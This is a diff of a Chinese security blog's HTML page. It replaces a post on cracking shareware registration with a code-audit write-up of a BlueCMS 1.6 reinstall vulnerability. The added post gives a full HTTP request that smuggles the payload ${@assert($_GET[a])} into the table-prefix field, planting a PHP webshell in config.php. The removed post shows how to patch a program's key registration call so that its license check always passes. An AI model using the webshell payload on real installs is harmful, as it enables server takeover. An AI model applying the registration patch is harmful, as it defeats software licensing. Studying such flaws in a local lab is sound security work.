@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>关键call和关键跳 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="关键call和关键跳 | 九世的博客">
+  <title>代码审计-文件重装漏洞 | 九世的博客</title>
+  <meta name="keywords" content=" 代码审计 ">
+  <meta name="description" content="代码审计-文件重装漏洞 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -1165,9 +1165,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-关键call和关键跳" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-代码审计-文件重装漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">关键call和关键跳</h1>
+        <h1 class="article-title">代码审计-文件重装漏洞</h1>
     
     <div class="article-meta">
         
@@ -1176,14 +1176,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">代码审计</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-28 12:30</time>
+        创建时间:<time class="date" title="更新时间: 2019-11-26 22:15:17">2019-11-26 21:43</time>
         
     </div>
     <div class="article-meta">
@@ -1205,7 +1205,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x001环境"><span class="toc-text">0x001环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02牛刀小试"><span class="toc-text">0x02牛刀小试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03参考链接"><span class="toc-text">0x03参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1220,10 +1220,228 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>恒大的教程去到第五课，关修改关键call的值实现破解。这里也跟着学习了一遍，关键跳的上面有个关键call。而关键call是决定关键跳是否跳转的主要因素。</p>
-<p><img src="https://i.imgur.com/HiZBHxU.jpg" alt=""></p>
-<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>这里用到的是教程里面的视频转换专家，百度上找一个下载。<br>首先先查壳<br><img src="https://i.imgur.com/a5ubBJ7.png" alt=""><br>查壳之后发现无壳，拖入OD进行分析。<br><img src="https://i.imgur.com/kMoWiy7.png" alt=""><br>搜索关键字”注册”，找到一个双击跳转<br><img src="https://i.imgur.com/5MqKTN6.png" alt=""><br><img src="https://i.imgur.com/UH6FmTP.png" alt=""><br>往上移看看能不能找到什么线索，发现一个跳转<br><img src="https://i.imgur.com/8i3Rh8A.png" alt=""><br>这个跳转跳过了注册成功，我们不要让他成功，可以使用Noop填充之类的操作。但是我们这次要学习的修改call的值，我们看看上面的call。下个断点，然后F9运行程序输入假码看看。<br><img src="https://i.imgur.com/CcaSR3l.png" alt=""><br>从call中我们可以发现，里面有我们输入的假码。F8单步像下看看<br><img src="https://i.imgur.com/H9oJZqc.png" alt=""><br>test al,al 可以看出EAX和ECX在进行比较。如果为1则注册成功，如果为0则注册不成功。而这一切的罪魁祸首就是call，所以我们进入call中进行修改(手动滑稽啦)<br><img src="https://i.imgur.com/bxQQwIT.jpg" alt=""><br>F7进入call<br><img src="https://i.imgur.com/Ek3PAwh.png" alt=""><br>修改如下图所示<br>mov eax,1(将1赋值给eax) retn（退出call）<br><img src="https://i.imgur.com/H11hDP7.png" alt=""><br>然后选择修改的部分复制到可执行文件，将其保存。<br><img src="https://i.imgur.com/Dkdk4bL.png" alt=""><br>发现已经按不了了，代表已经注册了。</p>
-<p>转载请注明:来自422926799.github.io</p>
+        <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>今天捞了一个CMS，打算学习一下代码审计。毕竟真正的大佬都会代码审计= =<br><img src="https://s2.ax1x.com/2019/11/26/QSHgr6.png" alt="QSHgr6.png"></p>
+<h1 id="0x001环境"><a href="#0x001环境" class="headerlink" title="0x001环境"></a>0x001环境</h1><pre><code>Phpstudy
+CMS:bluecms
+version:1.6_sp1
+</code></pre><h1 id="0x02牛刀小试"><a href="#0x02牛刀小试" class="headerlink" title="0x02牛刀小试"></a>0x02牛刀小试</h1><p>下载好源码解压到WWW目录，安装的时候抓包</p>
+<pre><code>POST /uploads/install/index.php?act=step4 HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 180
+Cache-Control: max-age=0
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://127.0.0.1/uploads/install/index.php?act=step3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=ckmi3slibob1f70ke38qesnae7
+Connection: close
+
+dbhost=localhost&amp;dbname=bluecms&amp;dbuser=root&amp;dbpass=root&amp;pre=blue_&amp;admin_name=admin&amp;admin_pwd=admin&amp;admin_pwd1=admin&amp;admin_email=fuck%40qq.com&amp;cookie_hash=LpAOf843D
+</code></pre><p>定位到/install/index.php</p>
+<pre><code class="php">&lt;?php
+/*
+ * [bluecms]版权所有 标准网络，保留所有权利
+ * This is not a freeware, use is subject to license terms
+ *
+ * $Id：index.php
+ * $author：lucks
+ */
+
+ #这几把站安装成功不会和你说安装成功了的
+ define(&#39;IN_BLUE&#39;, true);
+ require_once(dirname(__FILE__) . &#39;/include/common.inc.php&#39;);
+
+ if(file_exists(BLUE_ROOT.&#39;data/install.lock&#39;)){ #只判断了是否存在这个文件，然后输出了一句话，并没有退出，导致有重装漏洞
+     install_showmsg(&#39;您已经安装过本系统，如果想重新安装，请删除data目录下install.lock文件&#39;, &#39;../index.php&#39;);
+ }
+ $act = !empty($_REQUEST[&#39;act&#39;]) ? trim($_REQUEST[&#39;act&#39;]) : &#39;step1&#39;;
+
+ if($act == &#39;step1&#39;){
+     $install_smarty-&gt;display(&#39;step1.htm&#39;);
+ }
+ elseif($act == &#39;step2&#39;){
+     $system_info = array();
+    $system_info[&#39;version&#39;] = BLUE_VERSION;
+    $system_info[&#39;os&#39;] = PHP_OS;
+    $system_info[&#39;ip&#39;] = $_SERVER[&#39;SERVER_ADDR&#39;];
+    $system_info[&#39;web_server&#39;] = $_SERVER[&#39;SERVER_SOFTWARE&#39;];
+    $system_info[&#39;php_ver&#39;] = PHP_VERSION;
+    $system_info[&#39;max_filesize&#39;] = ini_get(&#39;upload_max_filesize&#39;);
+
+     $dir_check = check_dirs($need_check_dirs);
+     install_template_assign(array(&#39;dir_check&#39;, &#39;system_info&#39;), array($dir_check, $system_info));
+     $install_smarty-&gt;display(&#39;step2.htm&#39;);
+ }
+ elseif($act == &#39;step3&#39;){
+     $cookie_hash = chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;))).chr(mt_rand(ord(&#39;a&#39;),ord(&#39;z&#39;))).chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;))).chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;))).chr(mt_rand(ord(&#39;a&#39;),ord(&#39;z&#39;))).mt_rand(1,9999).chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;)));
+     install_template_assign(array(&#39;cookie_hash&#39;),array($cookie_hash));
+     $install_smarty-&gt;display(&#39;step3.htm&#39;);
+ }
+ elseif($act == &#39;step4&#39;){
+     $dbhost = isset($_POST[&#39;dbhost&#39;]) ? trim($_POST[&#39;dbhost&#39;]) : &#39;&#39;;
+     $dbname = isset($_POST[&#39;dbname&#39;]) ? trim($_POST[&#39;dbname&#39;]) : &#39;&#39;;
+     $dbuser = isset($_POST[&#39;dbuser&#39;]) ? trim($_POST[&#39;dbuser&#39;]) : &#39;&#39;;
+     $dbpass = isset($_POST[&#39;dbpass&#39;]) ? trim($_POST[&#39;dbpass&#39;]) : &#39;&#39;;
+     $pre  = isset($_POST[&#39;pre&#39;]) ? trim($_POST[&#39;pre&#39;]) : &#39;blue_&#39;; //表前缀
+     $admin_name = isset($_POST[&#39;admin_name&#39;]) ? trim($_POST[&#39;admin_name&#39;]) : &#39;&#39;; //admin_name处没做任何效验，可能造成二次注入
+    $admin_pwd = isset($_POST[&#39;admin_pwd&#39;]) ? trim($_POST[&#39;admin_pwd&#39;]) : &#39;&#39;;
+    $admin_pwd1 = isset($_POST[&#39;admin_pwd1&#39;]) ? trim($_POST[&#39;admin_pwd1&#39;]) : &#39;&#39;;
+    $admin_email = isset($_POST[&#39;admin_email&#39;]) ? trim($_POST[&#39;admin_email&#39;]) : &#39;&#39;; //email处没做任何效验，可能造成二次注入
+    $cookie_hash = isset($_POST[&#39;cookie_hash&#39;]) ? trim($_POST[&#39;cookie_hash&#39;]) : &#39;&#39;;
+
+    if($dbhost == &#39;&#39; || $dbname == &#39;&#39;|| $dbuser == &#39;&#39;|| $admin_name == &#39;&#39;|| $admin_pwd == &#39;&#39; || $admin_pwd1 == &#39;&#39; || $admin_email == &#39;&#39;){
+        install_showmsg(&#39;您填写的信息不完整，请核对&#39;);
+    }
+    if($admin_pwd != $admin_pwd1){
+        install_showmsg(&#39;您两次输入的密码不一致&#39;);
+    }
+
+    if(!$db = @mysql_connect($dbhost, $dbuser, $dbpass)){
+        install_showmsg(&#39;连接数据库错误，请核对信息是否正确&#39;);
+    }
+    mysql_query(&quot;CREATE DATABASE IF NOT EXISTS `&quot;.$dbname.&quot;`;&quot;,$db);
+    $mysql_version = mysql_get_server_info($db);
+    if(!mysql_select_db($dbname)){
+        install_showmsg(&#39;选择数据库错误，请检查是否拥有权限或存在此数据库&#39;);
+    }
+    mysql_query(&quot;SET NAMES &#39;&quot;.BLUE_CHARSET.&quot;&#39;,character_set_client=binary,sql_mode=&#39;&#39;;&quot;,$db);
+
+    $content = &#39;&lt;?&#39;.&quot;php\n&quot;;
+    $content .= &quot;\$dbhost   = \&quot;$dbhost\&quot;;\n\n&quot;;
+    $content .= &quot;\$dbname   = \&quot;$dbname\&quot;;\n\n&quot;;
+    $content .= &quot;\$dbuser   = \&quot;$dbuser\&quot;;\n\n&quot;;
+    $content .= &quot;\$dbpass   = \&quot;$dbpass\&quot;;\n\n&quot;;
+    $content .= &quot;\$pre    = \&quot;$pre\&quot;;\n\n&quot;;
+    $content .= &quot;\$cookiedomain = &#39;&#39;;\n\n&quot;;
+    $content .= &quot;\$cookiepath = &#39;/&#39;;\n\n&quot;;
+    $content .= &quot;define(&#39;BLUE_CHARSET&#39;,&#39;&quot;.BLUE_CHARSET.&quot;&#39;);\n\n&quot;;
+    $content .= &quot;define(&#39;BLUE_VERSION&#39;,&#39;&quot;.BLUE_VERSION.&quot;&#39;);\n\n&quot;;
+    $content .= &#39;?&gt;&#39;;
+
+    $fp = @fopen(BLUE_ROOT . &#39;data/config.php&#39;, &#39;wb+&#39;);
+    if (!$fp){
+        install_showmsg(&#39;打开配置文件失败&#39;);
+    }
+    if (!@fwrite($fp, trim($content))){
+        install_showmsg(&#39;写入配置文件失败&#39;);
+    }
+    @fclose($fp);
+
+    $fp = @fopen(BLUE_ROOT . &#39;data/update_log.txt&#39;, &#39;wb+&#39;);
+    if(!$fp){
+        install_showmsg(&#39;打开更新日志文件失败&#39;);
+    }
+    if(!@fwrite($fp, BLUE_UPDATE_NO)){
+        install_showmsg(&#39;写入更新文件失败&#39;);
+    }
+    @fclose($fp);
+
+    if(!$fp = @fopen(dirname(__FILE__).&#39;/sql-structure.sql&#39;,&#39;rb&#39;)){
+        install_showmsg(&#39;打开文件sql-structure.sql出错，请检查文件是否存在&#39;);
+    }
+    $query = &#39;&#39;;
+    while(!feof($fp))
+    {
+        $line = rtrim(fgets($fp,1024));
+        if(preg_match(&#39;/;$/&#39;,$line))
+        {
+            $query .= $line.&quot;\n&quot;;
+            $query = str_replace(&#39;blue_&#39;,$pre,$query);
+            if ( $mysql_version &gt; 4.1 )
+            {
+                mysql_query(str_replace(&quot;TYPE=MyISAM&quot;, &quot;ENGINE=MyISAM  DEFAULT CHARSET=gbk&quot;,  $query), $db);
+            }
+            else
+            {
+                mysql_query($query, $db);
+            }
+            $query=&#39;&#39;;
+         }
+         else if(!ereg(&#39;/^(//|--)/&#39;,$line))
+         {
+             $query .= $line;
+         }
+    }
+    @fclose($fp);
+
+    $query = &#39;&#39;;
+    if(!$fp = @fopen(dirname(__FILE__).&#39;/sql-data.sql&#39;,&#39;rb&#39;)){
+        install_showmsg(&#39;打开文件sql-data.sql出错，请检查文件是否存在&#39;);
+    }
+    while(!feof($fp)){
+         $line = rtrim(fgets($fp,1024));
+         if(ereg(&quot;;$&quot;,$line)){
+             $query .= $line;
+            $query = str_replace(&#39;blue_&#39;,$pre,$query);
+            mysql_query($query,$db);
+            $query=&#39;&#39;;
+         }
+         else if(!ereg(&quot;^(//|--)&quot;,$line)){
+            $query .= $line;
+         }
+    }
+    fclose($fp);
+
+    $site_url = &quot;http://&quot;.$_SERVER[&#39;SERVER_NAME&#39;].substr(dirname($php_self), 0, -8);
+    mysql_query(&quot;UPDATE `&quot;.$pre.&quot;config` SET value = &#39;&quot;.$cookie_hash.&quot;&#39; WHERE name = &#39;cookie_hash&#39;&quot;, $db);
+    mysql_query(&quot;UPDATE `&quot;.$pre.&quot;config` SET value = &#39;&quot;.$site_url.&quot;&#39; WHERE name = &#39;site_url&#39;&quot;, $db);
+    mysql_query(&quot;INSERT INTO `&quot;.$pre.&quot;admin` (admin_id, admin_name, email, pwd, purview, add_time, last_login_time, last_login_ip) VALUES (1, &#39;$admin_name&#39;, &#39;$admin_email&#39;, md5(&#39;$admin_pwd&#39;), &#39;all&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;, &#39;&#39;)&quot;, $db);
+    mysql_query(&quot;INSERT INTO &quot;.$pre.&quot;user (user_id, user_name, pwd, email, birthday, sex, money, face_pic, mobile_phone, home_phone, office_phone, qq, msn, address, reg_time, last_login_time, last_login_ip) VALUES (1, &#39;$admin_name&#39;, md5(&#39;$admin_pwd&#39;), &#39;$admin_email&#39;, &#39;0000-00-00&#39;, 0, &#39;0.00&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;, &#39;&#39;)&quot;, $db);
+
+    header(&#39;Location:index.php?act=step5&#39;);
+ }
+elseif($act == &#39;step5&#39;)
+{
+    define(&#39;IN_BLUE&#39;, TRUE);
+    include dirname(__FILE__) . &#39;/../include/common.inc.php&#39;;
+    include BLUE_ROOT . &#39;admin/include/common.fun.php&#39;;
+    update_data_cache();
+    update_pay_cache();
+    if(is_writable(BLUE_ROOT.&#39;data/&#39;))
+    {
+        $fp = @fopen(BLUE_ROOT.&#39;data/install.lock&#39;, &#39;wb+&#39;);
+        fwrite($fp, &#39;OK&#39;);
+        fclose($fp);
+    }
+     $install_smarty-&gt;display(&#39;step5.htm&#39;);
+}
+
+?&gt;
+
+</code></pre>
+<p>漏洞点出现在14行</p>
+<pre><code class="php"> if(file_exists(BLUE_ROOT.&#39;data/install.lock&#39;)){ #只判断了是否存在这个文件，然后输出了一句话，并没有退出，导致有重装漏洞
+    install_showmsg(&#39;您已经安装过本系统，如果想重新安装，请删除data目录下install.lock文件&#39;, &#39;../index.php&#39;);
+ }
+</code></pre>
+<p>判断完没有马上exit()退出，导致程序可以继续执行。可以无限重装<br>GIF<br><img src="https://s2.ax1x.com/2019/11/26/QSqNAU.gif" alt="QSqNAU.gif"></p>
+<p>尝试加入双引号想逃逸出双引号来写shell，发现被过滤了<br><img src="https://s2.ax1x.com/2019/11/26/QSq4gA.png" alt="QSq4gA.png"></p>
+<p>后面想了半天没想懂。。看了一下别的文章发现是common.inc.php在作祟<br><img src="https://s2.ax1x.com/2019/11/26/QSLV29.png" alt="QSLV29.png"></p>
+<p>addslashes()过滤掉了特殊字符，后面经过青鸟表哥的一波指点</p>
+<pre><code>${@assert($_GET[a])}
+</code></pre><p>就可以做shell来使用了，至于为什么自己试<code>assert($_GET[_])</code>不行，我也不清楚= =</p>
+<pre><code>POST /uploads/install/index.php?act=step4 HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 180
+Cache-Control: max-age=0
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://127.0.0.1/uploads/install/index.php?act=step3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=ckmi3slibob1f70ke38qesnae7
+Connection: close
+
+dbhost=localhost&amp;dbname=bluecms&amp;dbuser=root&amp;dbpass=root&amp;pre=${@assert($_GET[a])}&amp;admin_name=admin&amp;admin_pwd=admin&amp;admin_pwd1=admin&amp;admin_email=fuck%40qq.com&amp;cookie_hash=LpAOf843D
+</code></pre><p>最后结果<br><img src="https://s2.ax1x.com/2019/11/26/QSOpzd.png" alt="QSOpzd.png"></p>
+<h1 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h1><p><a href="http://www.fly63.com/article/detial/2506" target="_blank" rel="noopener">PHP中双引号引起的命令执行漏洞</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1233,12 +1451,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>关键call和关键跳</p>
+    <p><span class="copy-title">文章标题:</span>代码审计-文件重装漏洞</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-28, 12:30:37</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/f60102e8.html" title="关键call和关键跳">http://422926799.github.io/posts/f60102e8.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-26, 21:43:50</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-26, 22:15:17</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/1f457874.html" title="代码审计-文件重装漏洞">http://422926799.github.io/posts/1f457874.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
